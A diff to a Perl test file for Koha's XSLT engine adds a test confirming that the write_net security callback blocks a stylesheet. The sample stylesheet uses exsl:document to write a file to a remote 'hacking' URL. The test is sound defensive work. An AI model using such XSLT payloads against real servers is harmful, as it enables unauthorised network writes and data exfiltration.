@@ -19,7 +19,7 @@
 
 use Modern::Perl;
 use File::Temp qw/tempfile/;
-use Test::More tests => 6;
+use Test::More tests => 7;
 use Test::Warn;
 
 use Koha::XSLT::Base;
@@ -91,6 +91,22 @@ $xslt_file = mytempfile($xslt);
 warning_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
     qr/read_net called in XML::LibXSLT/,
     'Triggered security callback for read_net';
+
+# Trigger write_net
+$xslt=<<"EOT";
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
+  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
+  <xsl:template match="/">
+      <exsl:document href="http://hacking.koha-community.org/breached.txt" omit-xml-declaration="yes" method="html">
+    <xsl:text>Breached!</xsl:text>
+</exsl:document>
+  </xsl:template>
+</xsl:stylesheet>
+EOT
+$xslt_file = mytempfile($xslt);
+warning_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
+    qr/write_net called in XML::LibXSLT/,
+    'Triggered security callback for write_net';
 
 # Check remote import (include should be similar)
 # Trusting koha-community.org DNS here ;)
